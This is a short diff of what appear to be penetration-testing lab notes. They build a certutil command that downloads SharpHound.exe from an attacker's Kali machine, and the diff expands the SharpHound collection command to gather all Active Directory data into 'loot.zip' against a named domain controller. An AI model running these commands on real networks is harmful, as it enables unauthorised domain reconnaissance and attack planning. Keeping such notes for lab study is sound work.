@@ -70,7 +70,7 @@ const command = `certutil -urlcache -split -f http://${KaliIP}:80/SharpHound.exe
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 ```
-.\SharpHound.exe
+.\SharpHound.exe -c All -d {domain.htb} --zipfilename loot.zip
 ```
 
 .\SharpHound.exe -c All --domain secura.yzx --domaincontroller dc01.secura.yzx
